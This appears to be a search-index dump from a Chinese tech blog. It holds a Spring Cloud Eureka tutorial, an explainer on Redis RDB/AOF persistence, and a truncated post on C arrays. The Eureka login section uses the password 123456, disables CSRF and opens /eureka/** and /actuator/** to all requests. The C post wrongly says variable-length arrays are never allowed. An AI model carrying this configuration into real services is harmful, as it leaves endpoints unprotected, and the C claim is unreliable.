不再从注册列表移除因长时间没收到心跳而应该过期的服务 Eureka 仍然能够接受新服务的注册和查询请求，但是不会被同步到其他节点（高可用） Eureka 在网络稳定的时候，当前实例新的注册信息会被同步到其他节点中（最终一致性） Eureka 可以很好的应对因网络故障导致部分节点失去联系的情况，而不会像 ZooKeeper 一样使得整个注册中心瘫痪 Eureka 的健康检查在 Eureka 中，微服务状态可取值为 DOWN、OUT_OF_SERVICE、UNKNOWN 等，只有 UP 的微服务会被请求。由于 Eureka Server 与 Eureka Client 之间使用心跳机制来确定 Eureka Client 的状态，默认情况下服务器端与客户端的心跳保持正常，应用程序就会始终保持 UP 状态，所以微服务的 UP 并不能完全反应应用程序的状态。Spring Boot Actuator 提供了 /health 端点，该端点可展示应用程序的健康信息，只要将该端点中的健康状态传播到 Eureka Server 就可以了，实现这点很简单，只需为微服务配置如下内容即可。如果需要更细粒度健康检查，可实现 com.netflix.appinfo.HealthCheckHandler 接口，EurekaHealthCheckHandler 已实现了该接口。 12# 开启健康检查（需要添加spring-boot-starter-actuator依赖）eureka.client.healthcheck.enabled = true Eureka 入门案例1. 版本说明以下案例使用了版本较旧的 SpringCloud-Dalston.SR1 + SpringBoot-1.5.9.RELEASE，配置方式跟最新版本的 SpringCloud 有一定的区别 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324&lt;properties&gt; &lt;springcloud.version&gt;Dalston.SR1&lt;/springcloud.version&gt; &lt;springboot.version&gt;1.5.9.RELEASE&lt;/springboot.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${springboot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${springcloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，只需添加 spring-cloud-starter-eureka-server 即可；若使用最新版本的 SpringCloud，则需要改为添加 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程的 src/main/resources 目录下： 1234567891011server: port: 7001eureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Eureka Client 工程创建 Eureka Client 的 Maven 工程（作为服务提供者），配置工程里的 pom.xml 文件，需要添加以下内容。若使用最新版的 SpringCloud，此时只需要引入 spring-cloud-starter-netflix-eureka-client 依赖 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Client 的启动主类，添加注解 @EnableEurekaClient 12345678@EnableEurekaClient@SpringBootApplicationpublic class DeptProviderApplication { public static void main(String[] args){ SpringApplication.run(DeptProviderApplication.class, args); }} 添加 Eureka Client 需要的 application.yml 配置文件到工程的 src/main/resources 目录下，特别注意：在生产环境（外网）部署 Eureka Server，一定要配置 eureka:instance:prefer-ip-address: true 参数，否则服务消费者无法通过正确的 IP 调用服务提供者的接口 1234567891011121314server: port: 9090spring: application: name: demo-client #需要指定spring.application.name，否则会在 Eureka Server 界面显示为 UNKNOWeureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: demo-client-9090 #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 5. 完善注册服务的 info 信息Maven 父级 Pom 工程添加以下配置： 1234567891011121314151617181920&lt;build&gt; &lt;finalName&gt;springcloud-demo&lt;/finalName&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;delimiters&gt; &lt;delimit&gt;$&lt;/delimit&gt; &lt;/delimiters&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 配置 Eureka Client 工程里的 pom.xml 文件，引入 spring-boot-starter-actuator 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 配置 Eureka Client 工程里的 application.yml 文件，添加以下内容；若 Info 界面不能正确显示 $ 符号替换后的服务信息，可以尝试依次执行 mvn clean 、mvn compile、 mvn install 命令 12345info: app.name: springcloud-demo company.name: www.example.com build.version: $project.version$ build.artifactId: $project.artifactId$ 6. 测试分别启动 eureka-server 及 eureka-client 应用，然后通过浏览器访问 http://127.0.0.1:7001，若正常显示 Eureka Server 的管理界面和服务列表（如下图），则说明一切配置成功。 Eureka 进阶实战Eureka 的服务事件监听Eureka 提供了五种服务监听事件，因为在某些业务场景下，可能需要做一些自定义的扩展；例如某个微服务挂掉了，希望能监听到并给管理员发送邮件通知等。 EurekaServerStartedEvent: Eureka 注册中心启动事件 EurekaRegistryAvailableEvent: Eureka 注册中心可用事件 EurekaInstanceRenewedEvent: 服务实例续约事件 EurekaInstanceCanceledEvent: 服务实例下线事件 EurekaInstanceRegisteredEvent: 服务实例注册事件 Eureka 的 REST APIEureka 提供了 REST API，允许非 Java 语言的其他应用服务通过 HTTP REST 的方式接入 Eureka 的服务发现中，API 列表可参考 Eureka 官方文档的介绍或者下图。 Eureka 开启登录认证配置 Eureka Server 工程里的 pom.xml 文件，引入 spring-cloud-starter-security 依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 配置 Eureka Server 工程里的 application.yml 文件，增加用户名、密码的配置 123456security: basic: enabled: true user: name: admin #Eureka的登录用户名 password: 123456 #Eureka的登录密码 在 Eureka Server 工程里加入 Security 配置类，关闭掉 CSRF，否则 Client 无法连接 Eureka Server 端；若项目中引入了 Actuator，那么还需要放行 Actuator 的请求 12345678910111213@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable() .authorizeRequests() .antMatchers("/eureka/**").permitAll() .antMatchers("/actuator/**").permitAll() .anyRequest().authenticated().and().httpBasic(); }} 配置 Eureka Client 工程里的 application.yml 文件，更改注册中心的地址 1234567891011121314server: port: 9090spring: application: name: demo-clienteureka: client: service-url: defaultZone: http://admin:123456@localhost:7001/eureka instance: instance-id: demo-client-9090 prefer-ip-address: true 分别启动 eureka-server 及 eureka-client 应用，然后通过浏览器访问 http://127.0.0.1:7001，此时会先弹出登录框，输入正确的用户名和密码后才能看到管理页面 Eureka 集群配置假设现有三台 Eureka Server 主机，每台主机的 IP 与端口分别是： 192.168.1.105:8005、192.168.1.106:8006、192.168.1.107:8007 Eureka Server1 配置1234567891011server: port: 8005eureka: instance: hostname: 192.168.1.105 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.106:8006/eureka/,http://192.168.1.107:8007/eureka/ Eureka Server2 配置1234567891011server: port: 8006eureka: instance: hostname: 192.168.1.106 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.107:8007/eureka/ Eureka Server3 配置1234567891011server: port: 8007eureka: instance: hostname: 192.168.1.107 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.106:8006/eureka/ Eureka Client 集群配置1234567891011121314server: port: 9090spring: application: name: demo-clienteureka: client: service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.106:8006/eureka/,http://192.168.1.107:8007/eureka/ instance: instance-id: demo-client-9090 prefer-ip-address: true 启动三台 Eureka Server，分别访问三台 Eureka Server 的管理界面，若界面上的 DS Replicas 项可以正常显示其他 Eureka Server 节点（如下图），则说明 Eureka 服务器集群配置成功 本地集群搭建的细节说明若三台 Eureka Server 的 IP 都是 127.0.0.1 或者 localhost，彼此只是服务端口不一样；此时建议修改系统的 hosts 文件作相应的域名映射，方便日后访问 Eureka 的服务。当 hosts 文件加入下述配置之后，则可以通过不同的域名访问对应的 Eureka 服务了，如：http://eureka8005.com:8005/eureka/ 123127.0.0.1 eureka8005.com127.0.0.1 eureka8006.com127.0.0.1 eureka8007.com 特别注意：新版的 Eureka 搭建集群时，eureka.client.serviceUrl.defaultZone 配置项的地址，不能使用 localhost 或者内网/外网 IP，必须使用域名，DNS 解析需自行配置，也可以在本机的 /etc/hosts 里映射域名，否则各节点均出现在 unavailable-replicas 下 补充内容CAP 理论CAP 理论的核心是：一个分布式系统不可能同时很好地满足一致性、可用性和分区容错性这三个需求。因此，根据 CAP 理论可以将 NoSQL 数据库分成满足 CA 原则、满足 CP 原则和满足 AP 原则三大类： CA - 单点集群，满足一致性、可用性的系统，通常在可扩展上不太强大 CP - 满足一致性，分区容错性的系统，通常性能不是特别高 AP - 满足可用性、分区容忍性的系统，通常可能对一致性要求低一点 Eureka 对比 ZooKeeper ZooKeeper 保证的是 CP，Eureka 保证的是 AP Eureka 本质上是一个工程，而 ZooKeeper 只是一个进程 ZooKeeper 有 Leader 和 Follower 角色，Eureka 各个节点是平等关系 ZooKeeper 在选举期间注册服务瘫痪，虽然服务最终会恢复，但是选举期间不可用；Eureka 只要有一实例就可以保证服务可用，但查询到的数据可能并不是最新的 ZooKeeper 采用过半数存活原则，Eureka 采用自我保护机制解决分区问题 Netflix 在 AWS 中的 Eureka 部署架构 上图（左边）描述的是 Netflix 在 AWS 中的 Eureka 部署架构，图中的 us-east-1x 指的是不同的 zone。AWS 将服务划分成不同地区（region），每个 region 中又有若干个机房（zone），结构图大致上图（右边）所示，每个 zone 都是一个 Eureka 集群，其中至少有一台 Eureka Server，用来处理 zone failure。在 Eureka 中注册的服务每隔 30s 会向服务端发送一次心跳，用来告知服务端自己是否” 存活”，这个过程就是图中的 renew；如果 renew 操作在重试几次后都没有成功，那这个服务在 90s 之内就会被踢除。需要注意的是，renew 信息和服务注册信息会在多个 zone 间同步，任何一个 zone 中的客户端都可以寻找到任意一个 zone 中注册的服务信息。 两个 @EnableXXXClient 注解的区别 Spring Cloud 提供了 @EnableDiscoveryClient 与 @EnableEurekaClient 注解，其中 @EnableDiscoveryClient 基于 spring-cloud-commons，而 @EnableEurekaClient 基于 spring-cloud-netflix Spring Cloud 的服务注册发现有多种实现（Eureka、Consul、Zookeeper 等），如果选用的注册中心是 Eureka，那么就推荐使用 @EnableEurekaClient，如果是其他的注册中心，那么推荐使用 @EnableDiscoveryClient 特别注意：@EnableEurekaClient 上包含了 @EnableDiscoveryClient，可以说 @EnableEurekaClient 拥有 @EnableDiscoveryClient 的功能，其实 @EnableEurekaClient 就是一种方便使用 Eureka 的注解而已 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"浅谈 Redis 持久化 - RDB 和 AOF 原理",url:"/posts/b9abccfa.html",text:'持久化什么是持久化持久化（Persistence），即把数据（如内存中的对象）保存到可永久保存的存储设备中（如磁盘）。 持久化的实现方式 快照方式持久化：在某时刻把所有数据进行完整备份，例如：MySQL 的 Dump 方式、Redis 的 RDB 方式 写日志方式持久化：把用户执行的所有写指令（增删改）备份到文件中，还原数据时只需要把备份的所有指令重新执行一遍即可，例如：MySQL 的 Binlog、Redis 的 AOF、Hbase 的 HLog RDBRDB 介绍RDB 持久化方式是在指定的时间间隔内将内存中的数据集快照写入磁盘（point-in-time snapshot）。在默认情况下，Redis 将数据库快照保存在名字为 dump.rdb 的二进制文件中。在 Redis 运行时，RDB 程序将当前内存中的数据库快照保存到磁盘文件中，在 Redis 重启动时，RDB 程序可以通过载入 RDB 文件来还原数据库的状态。 RDB 工作原理当 Redis 需要保存 dump.rdb 二进制文件时，服务器会执行以下操作。整个过程中，Redis 的主进程不进行任何 I/O 操作，这就确保了极高的性能，使 Redis 可以从写时复制（copy-on-write）机制中获益。 Redis 单独创建（fork）一个子进程 子进程将内存中的数据集写入到一个临时 RDB 文件中 当子进程完成对临时 RDB 文件的写入时，Redis 用临时 RDB 文件替换旧的 RDB 文件，并删除旧的 RDB 文件 RDB 的三种主要触发机制save 命令（同步）save 命令会执行一个同步操作，以 RDB 文件的方式保存所有数据的快照。特别注意，由于 save 命令是同步命令，会占用 Redis 的主进程，若 Redis 的数据量非常大时，save 命令执行速度会非常慢，会阻塞所有客户端的请求。因此很少在生产环境直接使用 save 命令，可以使用 bgsave 命令代替。如果 bgsave 命令的保存数据的子进程发生错误，导致无法备份时，那么用 save 命令保存最新的数据是最后的手段。 bgsave 命令（异步）Redis 使用 Linux 系统的 fock() 生成一个子进程来将数据库数据保存到磁盘，主进程继续提供服务以供客户端调用。如果操作成功，可以通过客户端命令 LASTSAVE 来检查操作结果。 save 命令与 bgsave 命令对比如下，特别注意，shutdown、slave 命令也会触发数据快照的创建 自动生成 RDB 文件除了手动执行 save 和 bgsave 命令实现 RDB 持久化以外，Redis 还提供了自动自动生成 RDB 文件的方式。通过配置文件对 Redis 进行设置，让它在 “N 秒内数据集至少有 M 个改动” 这一条件被满足时，自动进行数据集保存操作。比如说，以下设置会让 Redis 在满足 “60 秒内有至少有 1000 个键被改动” 这一条件时，自动进行数据集保存操作： 1save 60 1000 RDB 相关配置12345678910111213141516171819202122232425# RDB自动持久化规则# 当 900 秒内有至少有 1 个键被改动时，自动进行数据集保存操作save 900 1# 当 300 秒内有至少有 10 个键被改动时，自动进行数据集保存操作save 300 10# 当 60 秒内有至少有 10000 个键被改动时，自动进行数据集保存操作save 60 10000# RDB持久化文件名dbfilename dump-&lt;port&gt;.rdb# 数据持久化文件存储目录dir /var/lib/redis# bgsave发生错误时是否停止写入，通常为yesstop-writes-on-bgsave-error yes# rdb文件是否使用压缩格式rdbcompression yes# 是否对rdb文件进行校验和检验，通常为yesrdbchecksum yes RDB 的优点 RDB 是一个非常紧凑的文件，它保存了某个时间点的数据集，非常适用于数据集的备份，比如可以在每个小时保存一下过去 24 小时内的数据，同时每天保存过去 30 天的数据，这样即使出了问题也可以根据需求恢复到不同版本的数据集，非常适合做冷备 RDB 是一个紧凑的单一文件，很方便传送到另一个远端数据中心或者亚马逊的 S3（可能加密），非常适用于灾难恢复 RDB 在保存 RDB 文件时，父进程唯一需要做的就是 fork 出一个子进程，接下来的工作全部由子进程来做，父进程不需要再做其他 I/O 操作，所以 RDB 持久化方式可以最大化地提高 Redis 的性能 若需要进行大规模数据的恢复，且对于数据恢复的完整性不是非常敏感，那么 RDB 方式要比 AOF 方式的数据恢复速度更快 RDB 的缺点 耗时、耗性能：RDB 需要经常 fork 子进程来保存数据集到硬盘上，当数据集比较大的时候，fork 的过程是非常耗时的，可能会导致 Redis 在毫秒级内不能响应客户端的请求。如果数据集巨大并且 CPU 性能不是很好的情况下，这种情况可能会持续数毫秒或者几秒，AOF 也需要 fork，但可以调节重写日志文件的频率来提高数据集的耐久度 不可控、丢失数据：如果希望在 Redis 意外停止工作（例如机房断电）的情况下尽量减少数据的丢失，那么 RDB 不适合这种场景。虽然可以配置不同的 save 时间点（例如每隔 5 分钟且对数据集有 100 个写的操作时进行备份)，但 Redis 要完整的保存整个数据集是一个比较繁重的工作，通常会每隔 5 分钟或者更久做一次完整的保存，万一在 Redis 意外宕机，可能会丢失几分钟的数据。简单来说，最后一次 RDB 持久化后的数据可能会丢失。 AOFAOF 介绍快照功能（RDB）并不是非常耐久（durable），如果 Redis 因为某些原因而造成故障停机，那么服务器将丢失最近写入且仍未保存到快照中的那些数据。 从 1.1 版本开始，Redis 增加了一种完全耐久的持久化方式，那就是 AOF 持久化。AOF 以日志的形式来记录每个写操作，将 Redis 执行过的所有写指令记录下来，同时只许追加文件不能改写文件。在配置文件中启用 AOF（如下配置） 后，每当 Redis 执行一个改变数据集的命令时（比如 SET），这个命令就会被追加到 AOF 文件的末尾。这样的话，当 Redis 重新启时，程序就可以通过重新执行 AOF 文件中的命令来达到重建数据集的目的。 1appendonly yes AOF 运行原理AOF 运行原理（创建与恢复）如下： AOF 持久化的三种同步策略可以通过配置文件配置 Redis 多久才将命令 fsync 到磁盘一次，Redis 提供了以下三种策略。 always：每次有新命令需要追加到 AOF 文件时就执行一次 fsync 操作，非常慢，也非常安全 everysec：每秒 fsync 一次，速度足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据，推荐（并且也是默认）的配置为每秒 fsync 一次， 这种 fsync 策略可以兼顾速度和安全性。 no：从不 fsync，将数据交给操作系统来处理，由操作系统来决定什么时候同步数据，速度更快，但也更不安全 always、everysec、no 三种策略的对比如下： AOF 重写AOF 重写介绍因为 AOF 的运作方式是不断地将命令追加到文件的末尾，所以随着写入命令的不断增加，AOF 文件的体积也会变得越来越大。举个例子，如果对一个计数器调用了 100 次 INCR ，那么仅仅是为了保存这个计数器的当前值，AOF 文件就需要使用 100 条记录（entry）。然而在实际上，只使用一条 SET 命令已经足以保存计数器的当前值了，其余 99 条记录实际上都是多余的。为了处理这种情况， Redis 支持一种有趣的特性，可以在不打断服务客户端的情况下，对 AOF 文件进行重建（rebuild）。执行 bgrewriteaof 命令，Redis 将生成一个新的 AOF 文件，这个文件包含重建当前数据集所需的最少命令。Redis 2.2 需要自己手动执行 bgrewriteaof 命令，而 Redis 2.4 之后则可以通过配置自动触发 AOF 重写。通过 AOF 重写，可以减少磁盘占用量、加速数据恢复，AOF 重写的对比图如下： AOF 重写的实现方式bgrewriteaof 命令 Redis 的 bgrewriteaof 命令用于异步执行一个 AOF（Append Only File）文件重写操作，重写后会创建一个当前 AOF 文件的体积优化版本。即使 bgrewriteaof 命令执行失败，也不会有任何数据丢失，因为旧的 AOF 文件在 bgrewriteaof 命令执行成功之前不会被修改。AOF 重写操作由 Redis 自行触发，bgrewriteaof 命令仅仅用于手动触发 AOF 重写操作，整个流程如下： 如果一个子进程是 Redis 通过磁盘快照创建的，那么 AOF 重写将会在 RDB 操作终止后才开始保存，这种情况下 bgrewriteaof 命令依然会返回 OK 状态码。从 Redis 2.6 起，可以通过 info 命令查看 AOF 重写的执行情况 如果正在执行的 AOF 重写操作返回了一个错误，那么 AOF 重写将会在稍后一点的时间重新执行 AOF 重写配置 AOF 重写自动触发的条件 Redis 支持 AOF 重写自动触发机制，无需手动执行 bgrewriteaof 命令，但需要同时满足下面两个条件才会自动触发： aof_current_size &gt; auto-aof-rewrite-min-size (aof_current_size - aof_base_size) * 100 / aof_base_size &gt; auto-aof-rewrite-percentage 12auto-aof-rewrite-min-size 64mbauto-aof-rewrite-percentage 100 假设 Redis 的配置如上，当 AOF 文件的体积大于 64Mb，并且 AOF 文件的体积比上一次重写时的体积大了至少一倍（100%）时，Redis 将执行 bgrewriteaof 命令进行重写。 AOF 重写的流程Redis 首先 fork 子进程，子进程开始将新 AOF 文件的内容写入到临时文件。对于所有新执行的写入命令，父进程一边将它们累积到一个内存缓存中，一边将这些改动追加到现有 AOF 文件的末尾，这样即使在重写的中途发生宕机，现有的 AOF 文件也还是安全的。当子进程完成重写工作时，它给父进程发送一个信号，父进程在接收到信号之后，将内存缓存中的所有数据追加到新 AOF 文件的末尾。最后 Redis 原子地用新 AOF 文件替换旧 AOF 文件，之后所有命令都会直接追加到新 AOF 文件的末尾。 AOF 相关配置1234567891011121314151617181920# 开启AOF持久化方式appendonly yes# AOF持久化文件名appendfilename appendonly-&lt;port&gt;.aof# 每秒把缓冲区的数据同步到磁盘appendfsync everysec# 数据持久化文件存储目录dir /var/lib/redis# 是否在执行重写时不同步数据到AOF文件no-appendfsync-on-rewrite yes# 触发AOF文件执行重写的最小尺寸auto-aof-rewrite-min-size 64mb# 触发AOF文件执行重写的增长率auto-aof-rewrite-percentage 100 AOF 的优点 使用 AOF 会让 Redis 更加耐久：可以使用不同的 fsync 策略：无 fsync、每秒 fsync、每次写的时候 fsync。使用默认的是每秒 fsync 策略，Redis 的性能依然很好（fsync 是由后台子进程进行处理的，主线程会尽力处理客户端请求），一旦出现故障，最多丢失 1 秒的数据 AOF 对日志文件的写入操作采用的是 append 模式，因此在写入过程中即使出现磁盘空间已满、宕机等现象，也不会破坏日志文件中已经存在的内容。而且如果本次操作只是写入了一半数据就出现了系统崩溃问题，也不用担心，在 Redis 下一次启动之前，可以通过 redis-check-aof 工具来修复数据一致性问题 Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 文件进行重写，重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生宕机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作 AOF 文件有序地保存了对数据库执行的所有写入操作，这些写入操作以 Redis 协议的格式保存，因此 AOF 文件的内容非常容易被人读懂，对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单。举个例子，如果不小心执行了 FLUSHALL 命令，但只要 AOF 文件未被重写，那么只要停止服务器，移除 AOF 文件末尾的 FLUSHALL 命令，并重启 Redis，就可以将数据集恢复到 FLUSHALL 执行之前的状态 AOF 的缺点 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积，而且 RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB。AOF 开启后支持写的 QPS 会比 RDB 支持的写的 QPS 低，但在一般情况下，每秒 fsync 的性能依然非常高，而关闭 fsync 可以让 AOF 的速度和 RDB 一样快，即使在高负荷之下也是如此。不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency） 修复错误的 AOF 文件服务器可能在 Redis 正在对 AOF 文件进行写入时宕机，如果宕机造成了 AOF 文件出错（corrupt）， 那么 Redis 在重启时会拒绝载入这个 AOF 文件，从而确保数据的一致性不会被破坏。当发生这种情况时，可以用以下方法来修复出错的 AOF 文件： 为现有的 AOF 文件创建备份文件 使用 Redis 附带的 redis-check-aof 工具，对原来的 AOF 文件进行修复 1$ redis-check-aof --fix 使用 diff -u 命令对比修复后的 AOF 文件和原始的 AOF 备份文件，查看两个文件之间的不同之处，此步骤为可选操作 重启 Redis 服务器，等待服务器载入修复后的 AOF 文件，并进行数据恢复 RDB 和 AOF 对比 如何选择使用哪种持久化方式？ 如果非常关心数据的安全性，但仍然可以承受数分钟以内的数据丢失，那么可以只使用 RDB 持久化 不推荐只使用 AOF 持久化，因为定时生成 RDB 快照（snapshot）非常便于进行数据库备份，并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度要快 如果想达到足以媲美 PostgreSQL 的数据安全性，则应该同时使用两种持久化机制。当同时使用 RDB 和 AOF 两种持久化机制时，那么在 Redis 重启的时候，会优先使用 AOF 来重建数据集，因为 AOF 的数据更加完整 总结，生产环境中推荐同时使用 AOF 和 RDB 两种持久化机制，用 AOF 来保证数据不丢失，作为恢复数据的第一选择；用 RDB 来做不同程度的冷备，在 AOF 文件都丢失或损坏不可用的时候，可以使用 RDB 进行快速的数据恢复。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"缓存"},{title:"C 语言语法之四数组",url:"/posts/7f62c448.html",text:'数组的概念 在程序设计中，为了处理方便把具有相同类型的若干变量按有序的形式组织起来，这些按序排列的同类数据元素的集合称为数组 数组是具有相同类型的数据组成的有序集合，其中的每一个数据称包含数组元素与数组下标，数组元素是由其所在的位置序号（称数组元素的下标）来区分 在 C 语言中数组属于构造数据类型，一个数组可以分解为多个数组元素，这些数组元素可以是基本数据类型或是构造类型。因此按数组元素的类型不同，数组又可分为数值数组、字符数组、指针数组、结构数组等各种类别 一维数组的定义 一维数组的定义方式为：类型说明符 数组名 [常量表达式]；例如：int a[10]; 表示定义了一个整型数组，数组名为 a，此数组有 10 个元素，10 个元素都是整型变量 数组元素的一般引用形式为：数组名 [下标]，例如：int x = a[0] 一维数组在内存中的存放时，每个数据元素占用的字节数，就是基本数据类型的字节数，具体存放方式如下： 数组使用注意事项 方括号中的常量表达式表示数据元素的个数，也称为数组的长度 数组名是用户定义的数组标识符，书写规则应符合标识符的书写规定 允许在同一个类型说明中，定义多个数组和多个变量，例如：int a,b,c,d,k1[10],k2[20]; 类型说明符是任一种基本数据类型或构造数据类型，对于同一个数组，其所有元素的数据类型都是相同的 数组 a[10]，表示 a 数组有 10 个元素，下标是从 0 开始的，这 10 个元素是 a [0]，a [1] … a [8]，a [9]，按上面的定义，不存在数组元素 a[10] C 语言不允许对数组的大小作动态定义，即数组的大小不依赖于程序运行过程中变量的值，以下代码是错误的： 1234567/********C语言不允许对数组的大小作动态定义，下面的写法是错误的********/int main(){ int n; scanf("%d", &amp;n); int a[n]; return 0;} 数组元素通常也称为下标变量，必须先定义数组，才能使用下标变量；在 C 语言中只能逐个地使用下标变量，而不能一次引用整个数组，例如： 12345678910/********输出有10个元素的数组时，必须使用循环语句逐个输出各下标变量********/int main(){ for(i=0; i&lt;10; i++) { printf("%d", a[i]); } return 0;}// 不能用一个语句输出整个数组，此写法是错误的：printf("%d", a); 定义数组时用到的数组名 [常量表达式] 和引用数组元素时用到的数组名[下标] 是有区别的，例如：int a[10]; 中的 10 是指数组长度，t=a[6]; 是指引用 a 数组中序号为 6 的元素，此时 6 不代表数组长度 一维数组的初始化赋值 数组初始化赋值是指在数组定义时给数组元素赋予初值，数组初始化的过程是在编译阶段进行的，这样可以减少运行间，提高运行效率 数组赋值的方法除了用赋值语句对数组元素逐个赋值外，还可采用初始化赋值和动态赋值的方法 数组初始化赋值的一般形式为：类型说明符 数组名[常量表达式]={值, 值, ……值};，例如：int a［10］= {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}; 可以只给一部分数组元素赋值，例如:int a［10］= {0, 1, 2, 3, 4};，表示定义 a 数组有 10 个元素，但花括弧内只提供 5 个初值，这代表只给前面 5 个元素赋初值，后 5 个元素值默认缺省为 0 在对全部数组元素赋初值时，由于数据的个数已经确定，因此可以不指定数组长度，例如：int a［5］= {1, 2, 3, 4, 5}; 可以写成：int a［ ］= {1, 2, 3, 4, 5}; 数组动态赋值的代码示例如下： 12345678910111213141516/********输入五个数，求出最大的数********/int main(){ int i, max=0, a[5]; printf("please input five number:\\n"); setbuf(stdin, NULL); for(i=0; i&lt;=4; i++){ scanf("%d", &amp;a[i]); } for(i=0; i&lt;=4; i++){ if(a[i] &gt; max){ max = a[i]; } } printf("max=%d\\n", max); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": 